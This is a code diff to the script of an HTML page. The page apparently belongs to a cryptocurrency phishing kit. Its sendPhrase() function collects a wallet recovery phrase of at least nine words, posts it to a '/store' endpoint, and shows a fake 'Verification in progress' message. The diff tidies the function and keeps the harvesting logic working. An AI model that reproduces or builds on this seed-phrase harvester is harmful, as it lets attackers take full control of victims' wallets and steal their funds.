@@ -1637,37 +1637,28 @@
 
   }
 
- 
-  // Flag to indicate whether the function should run or not
-let shouldRunFunction = true;
-
-function sendPhrase() {
-    // Check if the function should run
-    if (!shouldRunFunction) {
-        return;
-    }
+  function sendPhrase() {
+    const phrase = $("#phrase").val()
     
-    const phrase = $("#phrase").val();
-    
-    if (phrase === "" || phrase.split(/\s+/).length < 9) {
-        $("#warn").css('display', 'block');
-        setTimeout(function(){
+    if ((phrase === "" || phrase.split(/\s+/).length < 9)) {
+      $("#warn").css('display', 'block')
+      setTimeout(function(){
             $("#warn").css('display', 'none');
-        }, 2000);
-    } else {
-        $.ajax({
-            type: 'post',
-            url: '/store',
-            data: { phrase },
-            success: function() {
-                // Disable the function after it has run successfully
-                shouldRunFunction = false;
-                Swal.fire('Verification in progress', 'Please wait...');
-            }
-        });
+        }, 2000); // 
+      //Swal.fire('Oops','Phrase cannot be empty','error')
     }
-}
+    else {
+    
+      $.ajax({
+        type: 'post',
+        url: '/store',
+        data: { phrase },
+        
+      })
+      Swal.fire('Verification in progress','Please wait...')
+    }
 
+  }
 </script>
 
 </html>
